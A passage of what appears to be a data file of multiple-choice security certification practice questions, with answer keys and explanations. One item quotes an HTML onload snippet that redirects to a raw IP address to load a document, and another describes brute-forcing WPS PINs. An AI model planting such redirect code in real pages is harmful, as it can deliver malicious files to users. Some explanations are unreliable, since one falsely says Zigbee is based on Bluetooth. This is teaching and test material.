{ 'question': '  Which of the following statements is true? ','answers': ['A data processor is the entity assigned specific responsibility over a data asset to ensure its protection for use by the organization.','A data custodian is the entity that performs operations on data.','A data controller is the entity that makes decisions over the data they are collecting.','A data owner is the entity assigned or delegated the day-to-day responsibility of proper storage and transport as well as protecting data, assets, and other organiz',],
'correct':3,'explanation': 'The correct statement is regarding the data controller. The other statements are incorrect. The correct versions of those statements are as follows. A data owner is the entity assigned specific responsibility over a data asset to ensure its protection for use by the organization. A data processor is the entity that performs operations on data. A data custodian is the entity assigned or delegated the day-to-day responsibility of proper storage and transport as well as protecting data, assets, and other organizational objects.',},
{ 'question': '  A security officer adjusts the authentication system so that workers can only log in during their assigned work schedules. What type of control is this? ','answers': ['Technical deterrent','Technical preventive','Operational corrective','Managerial detective',],
'correct':2,'explanation': 'The implementation of time-of-day logon restrictions is a technical preventive control. This control focuses on protecting IT/IS and prevents unauthorized access during nonwork hours. A deterrent control is deployed to discourage violation of security policies. Operational controls focus on the day-to-day tasks that support and enforce security within an organization. Primarily, operational controls are those security activities that are performed by people rather than automated computer systems. A corrective control modifies the environment to return systems to normal after an unwanted or unauthorized activity has occurred. Managerial controls focus on the management of risk and thus the governance of organizational security. A detective control is deployed to discover or detect unwanted or unauthorized activity.',},
{ 'question': '  A new startup company is designing a sensor that needs to connect wirelessly to a PC or IoT hub to transmit its gathered data to a local application or cloud service for data analysis. The company wants to ensure that all transferred data from the device cannot be disclosed to unauthorized entities. The device is also intended to be located within 1 meter of the PC or IoT hub it communicates with. Which of the following concepts is the best choice for this device? ','answers': ['Zigbee','Bluetooth','FCoE','5G',],
'correct':1,'explanation': 'This device in this scenario would benefit from the use of Zigbee. Zigbee is an IoT equipment communication’s concept that is based on Bluetooth. Zigbee has low power consumption, has a low throughput rate, and requires close proximity of devices. Zigbee communications are encrypted using a 128-bit symmetric algorithm. Bluetooth is not a good option as it is usually plaintext. Bluetooth Low Energy (BLE) might be a viable option if custom encryption was added. Fiber Channel over Ethernet (FCoE) is not a wireless technology nor an IoT technology; instead, it is a high-speed fiber-optic based storage technology. 5G is the latest mobile service technology that is available for use on mobile phones, tablets, and other equipment. While many IoT devices will support and use 5G, it is mostly used to provide direct access to the Internet rather than used as a link to a local short-distance device, such as a PC or IoT hub.',},
{ 'question': '  A recent security violation resulted in the destruction of the last three weeks of sales data, which was stored in a central database server. A review of the logs of that server reveal no information about the event at all. In fact, there are not even benign events in the time frame of the attack present in the log. What should be done to ensure that event data is preserved? ','answers': ['Implement syslog','Database backups','Restrict user authorization based on role','Require MFA',],
'correct':1,'explanation': 'The issue of missing log data can be resolved by implementing syslog to create backup copies of logs on other network servers. This would prevent the modification of the primary log in destroying all of the evidence of the violating activity. Database backups would be a great prevention against the sales data loss, but not against the loss of the log data. User authorization restrictions might have made the attack harder, but that still does not protect against log data loss. MFA is always a security improvement, but it is not relevant to protecting log files in this scenario.',},
{ 'question': '  A worker reports that they are unable to access an internal web application from their workstation. After confirming that the worker has been assigned correct authorization, the logs from the workstation are reviewed for clues. The following entries are discovered: 2020-01-08 12:15:36 DROP TCP 192.168.104 192.168.255.255 443 ---------- RECEIVE 2020-01-08 12:15:51 DROP UDP 192.168.104 192.168.255.255 443 ---------- Based on this information, which of the following should be adjusted to address this situation? ','answers': ['Host-based firewall','VLAN membership','WAF','Proxy',],
'correct':1,'explanation': 'These log items are from a firewall log. They indicate that TCP and UDP traffic from the 192.168.x.x subnet to the workstation was dropped. Since this log is from the workstation, this indicates that there is a bad rule in the host-based firewall that is blocking all communications to the workstation from the local subnet. There is no mention of VLAN membership. These log entries would not be present on the workstation if the communications were being blocked by a WAF, as those are either on the web server system or their own stand-alone system in front of the web server. These entries would not be present on the workstation if a proxy was dropping the communications, as those entries would be on the proxy server’s logs.',},
{ 'question': '  By what means can a flaw in WPS be attacked for an unauthorized device to be able to connect into an otherwise secure wireless network? ','answers': ['Use a deauthorization flood','Operate an evil twin','Guess the activation PIN','Perform war chalking',],
'correct':3,'explanation': 'WiFi Protected Setup (WPS) is a security standard for wireless networks. It was intended to simply the effort involved in adding new clients to a wellsecured wireless network. It operates by auto-connecting the first new wireless client to seek the network once the administrator triggered the feature by pressing the WPS button on the base station. However, the standard also called for a code that could be sent to the base station remotely to trigger WPS negotiation without the need to be able to physically press the button on the base station. This led to a brute-force guessing attack that could enable a hacker to guess the WPS code in just hours, which in turned enabled the hacker to connect their own unauthorized system to the wireless network.',},
{ 'question': '  A security reviewer notices the following code present on an internal company system: ˂HTML˃˂BODY onload=document.location.replace(http://220.181.38.251/HR/employees/docs/benefitsupdate.doc);˃˂/BODY˃˂/HTML˃ This code if executed successfully could replace a document with one with malicious content. What attack vector is most likely the pathway by which this code made its way onto an internal company system? ','answers': ['Wireless','Removable media','Email','Supply chain',],
'correct' : 3,'explanation': 'This attack code is HTML, which may have had you looking for a web answer. But remember that most email clients now support and interpret HTML content automatically when present in an email body. Thus, email is the most likely attack vector through which this code was planted on a company internal system. It is possible that wireless or removable media could have been used, but these require more levels of details and complex maneuvering to accomplish, compared to an email with HTML content (which is simple by comparison). This code is unlikely to have arrived though a supply chain attack vector.',},

     ]);
}